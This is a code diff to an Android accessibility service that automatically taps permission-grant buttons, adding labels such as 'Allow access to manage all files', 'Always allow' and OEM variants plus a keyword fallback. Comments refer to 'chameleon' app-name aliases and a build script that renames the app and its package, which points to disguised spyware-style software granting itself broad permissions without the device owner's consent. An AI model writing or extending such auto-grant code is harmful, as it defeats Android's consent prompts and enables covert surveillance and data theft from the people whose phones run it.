@@ -1502,23 +1502,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         String screenText = getAllScreenText(rootNode);
         String screenTextLower = screenText.toLowerCase();
 
-        // ── Guard: only run on screens that belong to us ──────────────────────────────
-        // Fast path A: screen contains both a grant button AND a deny button → this is
-        //   unambiguously a runtime-permission dialog for our app.  Skip the name check
-        //   entirely so a chameleon label mismatch can never cause us to miss the dialog.
-        boolean hasDeny  = screenTextLower.contains("don't allow")
-                        || screenTextLower.contains("dont allow")
-                        || screenTextLower.contains("deny");
-        boolean hasAllow = screenTextLower.contains("allow");
-        boolean looksLikePermissionDialog = hasDeny && hasAllow;
-
-        if (!looksLikePermissionDialog) {
-            // Not a classic permission dialog — require our app name on screen so we
-            // don't accidentally click Allow on some unrelated third-party dialog.
-            // Check every label the OS might show (base name + all chameleon aliases +
-            // the runtime PackageManager label in case the build customised it).
-            if (!isAnyAppNameOnScreen(screenTextLower)) return false;
-        }
+        // ── Guard: only run on screens that belong to THIS app ───────────────────────
+        // We ALWAYS require our app's label to appear on screen.  This prevents the
+        // granter from accidentally clicking Allow on permission dialogs belonging to
+        // other apps.  It also handles any app-name or package-ID change made by
+        // build.sh because isAnyAppNameOnScreen() derives the label at runtime via
+        // PackageManager, so it always matches whatever name the build assigned.
+        if (!isAnyAppNameOnScreen(screenTextLower)) return false;
 
         // ── Step 0: "Allow access" pattern (Files & Storage / Notification access pages) ──
         if (runAppNameAllowAccessClicker(rootNode)) return true;
@@ -1526,12 +1516,23 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // ── Step 1: Permanent / all-the-time grants (highest priority) ──
         // These must be tried BEFORE plain "Allow" so we don't accidentally
         // land on a different button on the same dialog.
+        // Also covers Android 11+ "Manage all files" / file-access patterns.
         String[] allTheTime = {
             "Allow all the time",
             "Always allow",
             "Always",
             "Allow all",
-            "Permit all the time"
+            "Permit all the time",
+            // Android 11+ MANAGE_EXTERNAL_STORAGE / Files access dialogs
+            "Allow access to manage all files",
+            "Allow management of all files",
+            "Allow access to all files",
+            "Access all files",
+            "Manage all files",
+            // Some OEM storage dialogs
+            "Allow access to media",
+            "Allow access to files and media",
+            "Allow access to photos, media, and files"
         };
         for (String btn : allTheTime) {
             if (safeClickTextElementCI(rootNode, btn)) {
@@ -1578,7 +1579,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             "Continue",
             "Turn on",
             "Enable",
-            "Permit"
+            "Permit",
+            // OEM-specific button labels (MIUI / EMUI / ColorOS / OneUI)
+            "Allow permission",
+            "Allow permissions",
+            "Authorize",
+            "Confirm",
+            "Proceed",
+            "Approve",
+            "Give permission",
+            "Grant permission",
+            "Grant access",
+            "Allow access"
         };
         for (String btn : plainGrant) {
             if (safeClickTextElementCI(rootNode, btn)) {
@@ -1592,7 +1604,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         // ── Step 5: Contains-based OEM fallback ──
         // Only match if the full button text is NOT in the deny list.
-        String[] containsFallback = { "allow", "grant", "permit", "accept" };
+        // "allow" catches "Allow permission", "Allow access", etc.
+        // "authorize"/"approve" catch OEM-specific phrasings.
+        String[] containsFallback = { "allow", "grant", "permit", "accept", "authorize", "approve" };
         for (String kw : containsFallback) {
             if (safeClickTextContainingCI(rootNode, kw)) {
                 Log.i(TAG, "Auto-grant: clicked via contains fallback \"" + kw + "\"");
